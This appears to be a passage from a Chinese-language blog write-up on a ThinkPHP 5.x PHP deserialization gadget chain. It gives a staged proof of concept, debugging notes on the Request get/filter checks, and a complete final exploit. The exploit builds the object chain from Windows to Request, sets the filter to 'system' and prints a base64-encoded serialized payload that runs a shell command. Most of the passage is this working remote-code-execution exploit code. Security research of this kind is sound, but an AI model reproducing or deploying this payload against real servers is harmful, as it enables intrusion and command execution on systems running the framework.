+<p>所以首先是Windows</p>
+<p><img src="image-20211013190812410.png" alt="image-20211013190812410"></p>
+<p><img src="image-20211013190850613.png" alt="image-20211013190850613"></p>
+<p><img src="image-20211013190912843.png" alt="image-20211013190912843"></p>
+<p>后面就一样了</p>
+<pre><code class="php">阶段poc
+//class Request 执行终点
+namespace think;
+class Request{
+    protected $filter;
+    public function __construct()
+    {
+        $this-&gt;filter = &quot;system&quot;;
+    }
+}
+
+//abstract class Driver{} Memcache父类
+namespace think\cache;
+use think\Request;
+abstract class Driver{
+    protected $handler = null;
+    protected $tag;
+    public function __construct()
+    {
+        $this-&gt;tag = true;
+        $this-&gt;handler = new Request();
+    }
+}
+
+//class Memcache extends Driver 调向Request
+namespace think\cache\driver;
+use think\cache\Driver;
+class Memcache extends Driver{}
+
+//class Memcache extends SessionHandler 调向上面Memcache类的set方法
+namespace think\session\driver;
+use SessionHandler;
+class Memcache extends SessionHandler{
+    protected $handler = null;
+    public function __construct()
+    {
+        $this-&gt;handler = new \think\cache\driver\Memcache();
+    }
+}
+
+//class Output
+namespace think\console;
+use think\session\driver\Memcache;
+class Output{
+    private $handle = null;
+    protected $styles = [&#39;getAttr&#39;];
+    public function __construct()
+    {
+        $this-&gt;handle = new Memcache();
+    }
+}
+
+// TODO 断点
+//class Query 指向Output
+namespace think\db;
+use think\console\Output;
+class Query{
+    protected $model;
+    public function __construct()
+    {
+        $this-&gt;model = new Output();
+    }
+}
+
+//abstract class Relation
+namespace think\model;
+use think\db\Query;
+abstract class Relation{
+    protected $query;
+    public function __construct()
+    {
+        $this-&gt;query = new Query();
+    }
+}
+
+//abstract class OneToOne extends Relation
+namespace think\model\relation;
+use think\model\Relation;
+abstract class OneToOne extends Relation {
+    protected $bindAttr = [];
+    public function __construct()
+    {
+        parent::__construct();
+        $this-&gt;bindAttr = [&quot;no&quot;,&quot;123&quot;];
+    }
+}
+
+//class BelongsTo extends OneToOne
+namespace think\model\relation;
+class BelongsTo extends OneToOne{}
+
+//abstract class Model 指向Output类__call()
+namespace think;
+use think\console\Output;
+use think\model\relation\BelongsTo;
+abstract class Model{
+    protected $error;
+    protected $append = [];
+    protected $parent;
+    public function __construct()
+    {
+            $this-&gt;append =[&#39;getError&#39;];
+            $this-&gt;error = new BelongsTo();
+            $this-&gt;parent = new Output();
+    }
+}
+
+//class Pivot extends Model 继承Model,通过此类调用进Model
+namespace think\model;
+use think\Model;
+class Pivot extends Model{}
+
+//abstract class Pipes Windows继承类
+namespace think\process\pipes;
+abstract class Pipes{}
+
+//class Windows extends Pipes 起点类 指向Pivot类
+namespace think\process\pipes;
+use think\model\Pivot;
+class Windows extends Pipes{
+    private $files = [];
+    public function __construct()
+    {
+        $this-&gt;files = [new Pivot()];
+    }
+}
+
+$Windows = new Windows();
+echo base64_encode(serialize($Windows));
+</code></pre>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>最终exp还要修改几个小点才可以调用成功，这里是我漏的几点分析</p>
+<p>其实就是Request中input的一处判断问题</p>
+<p><img src="image-20211013212652688.png" alt="image-20211013212652688"></p>
+<h3 id="exp分析-补"><a href="#exp分析-补" class="headerlink" title="exp分析(补)"></a>exp分析(补)</h3><h4 id="Request中get赋值问题"><a href="#Request中get赋值问题" class="headerlink" title="Request中get赋值问题"></a>Request中get赋值问题</h4><p>如果用阶段poc打，会在如图所示的位置出问题</p>
+<p><img src="image-20211013211917186.png" alt="image-20211013211917186"></p>
+<p><strong>在Request.php中调用get()方法时，如果get值为空，则会自动调用传入的get，导致get变成$_GET传入值</strong></p>
+<p>并如下图所示传给input()</p>
+<p><img src="image-20211013212124505.png" alt="image-20211013212124505"></p>
+<p>并会造成getinput()中if语句不能成功匹配，导致rce链中断</p>
+<p><img src="image-20211013212347171.png" alt="image-20211013212347171"></p>
+<p>所以需要给get赋值</p>
+<h3 id="isset-data-val"><a href="#isset-data-val" class="headerlink" title="isset($data[$val]"></a>isset($data[$val]</h3><p>先随便赋值看看下一个问题</p>
+<p><img src="image-20211013212804889.png" alt="image-20211013212804889"></p>
+<p>上一个问题点成功绕过</p>
+<p><img src="image-20211013213022459.png" alt="image-20211013213022459"></p>
+<p>下个问题点</p>
+<p><img src="image-20211013213156418.png" alt="image-20211013213156418"></p>
+<p>显然,$data[$val]这个齐齐怪怪的东西在$data中不存在，$data就是传入的get数组</p>
+<p>所以：**$val的值等于传入get数组的key值**</p>
+<p>然后再下图处完成$filter的赋值</p>
+<p><img src="image-20211013213855627.png" alt="image-20211013213855627"></p>
+<p>而在下面**<code>$this-&gt;filterValue($data, $name, $filter);</code> $data（传入get数组的value值）做为参数&amp;$value传入**</p>
+<p>并在终点执行</p>
+<p><img src="image-20211013214240347.png" alt="image-20211013214240347"></p>
+<p><strong>这里的foreach 告诉我们,传入的filter最好为数组，不过调试时我发现框架会自己吧字符串变成数组，所以这里无所谓数组字符串</strong></p>
+<p>言归正传</p>
+<p>说了这么多，我就是想说，别把$data浪费了，所以<strong>get = [合法 $val(key)=&gt; system函数参数(value)]</strong></p>
+<p>于是 </p>
+<pre><code class="php">get = [&#39;&quot;&lt;getAttr&gt;no&lt;&#39; =&gt; &#39;dir&#39;]; //【手动滑稽】
+</code></pre>
+<p>苟是苟了点，不过它不烧脑</p>
+<p><img src="image-20211013215417174.png" alt="image-20211013215417174"></p>
+<p>这不就过去了</p>
+<p>好吧我们正经一点，按gml大佬写的来</p>
+<p><img src="image-20211013220802675.png" alt="image-20211013220802675"></p>
+<p><strong>在这个位置，框架以 <code>/</code>为分界，将$name划为数组【就是上面的<code>&lt;getAttr&gt;no&lt;/getAttr&gt;</code>】</strong></p>
+<p><img src="image-20211013221000548.png" alt="image-20211013221000548"></p>
+<p><strong>而在Driver类的getCacheKey处可以控制$name,将options[‘prefix’] ,拼接到$name前面</strong></p>
+<p><strong>所以 我们可以让<code>options[&#39;prefix&#39;] = xxx/</code>，这样$val就会成为写入的xxx</strong></p>
+<p>然后设置<code>get = [&#39;xxx&#39; =&gt; &#39;dir&#39;]</code>，就可以解决第二个问题</p>
+<pre><code class="php">$this-&gt;get = [&#39;atmujie&#39;=&gt;&#39;dir&#39;];
+$this-&gt;options = [&#39;prefix&#39;=&gt;&#39;atmujie/&#39;];
+</code></pre>
+<p>这样写不就优雅多了</p>
+<p><img src="image-20211013221601612.png" alt="image-20211013221601612"></p>
+<p><img src="image-20211013221447371.png" alt="image-20211013221447371"></p>
+<p>执行成功</p>
+<h3 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h3><pre><code class="php">&lt;?php
+//class Request 执行终点
+namespace think;
+class Request{
+    protected $filter;
+    protected $get     = [];
+    public function __construct()
+    {
+        $this-&gt;get = [&#39;atmujie&#39;=&gt;&#39;dir&#39;];
+        $this-&gt;filter = &quot;system&quot;;
+    }
+}
+
+//abstract class Driver{} Memcache父类
+namespace think\cache;
+use think\Request;
+abstract class Driver{
+    protected $handler = null;
+    protected $tag;
+    protected $options = [];
+    public function __construct()
+    {
+        $this-&gt;tag = true;
+        $this-&gt;handler = new Request();
+        $this-&gt;options = [&#39;prefix&#39;=&gt;&#39;atmujie/&#39;];
+    }
+}
+
+//class Memcache extends Driver 调向Request
+namespace think\cache\driver;
+use think\cache\Driver;
+class Memcache extends Driver{}
+
+//class Memcache extends SessionHandler 调向上面Memcache类的set方法
+namespace think\session\driver;
+use SessionHandler;
+class Memcache extends SessionHandler{
+    protected $handler = null;
+    public function __construct()
+    {
+        $this-&gt;handler = new \think\cache\driver\Memcache();
+    }
+}
+
+//class Output
+namespace think\console;
+use think\session\driver\Memcache;
+class Output{
+    private $handle = null;
+    protected $styles = [&#39;getAttr&#39;];
+    public function __construct()
+    {
+        $this-&gt;handle = new Memcache();
+    }
+}
+
+// TODO 断点
+//class Query 指向Output
+namespace think\db;
+use think\console\Output;
+class Query{
+    protected $model;
+    public function __construct()
+    {
+        $this-&gt;model = new Output();
+    }
+}
+
+//abstract class Relation
+namespace think\model;
+use think\db\Query;
+abstract class Relation{
+    protected $query;
+    public function __construct()
+    {
+        $this-&gt;query = new Query();
+    }
+}
+
+//abstract class OneToOne extends Relation
+namespace think\model\relation;
+use think\model\Relation;
+abstract class OneToOne extends Relation {
+    protected $bindAttr = [];
+    public function __construct()
+    {
+        parent::__construct();
+        $this-&gt;bindAttr = [&quot;no&quot;,&quot;123&quot;];
+    }
+}
+
+//class BelongsTo extends OneToOne
+namespace think\model\relation;
+class BelongsTo extends OneToOne{}
+
+//abstract class Model 指向Output类__call()
+namespace think;
+use think\console\Output;
+use think\model\relation\BelongsTo;
+abstract class Model{
+    protected $error;
+    protected $append = [];
+    protected $parent;
+    public function __construct()
+    {
+            $this-&gt;append =[&#39;getError&#39;];
+            $this-&gt;error = new BelongsTo();
+            $this-&gt;parent = new Output();
+    }
+}
+
+//class Pivot extends Model 继承Model,通过此类调用进Model
+namespace think\model;
+use think\Model;
+class Pivot extends Model{}
+
+//abstract class Pipes Windows继承类
+namespace think\process\pipes;
+abstract class Pipes{}
+
+//class Windows extends Pipes 起点类 指向Pivot类
+namespace think\process\pipes;
+use think\model\Pivot;
+class Windows extends Pipes{
+    private $files = [];
+    public function __construct()
+    {
+        $this-&gt;files = [new Pivot()];
+    }
+}
+
+$Windows = new Windows();
+echo base64_encode(serialize($Windows));
+</code></pre>
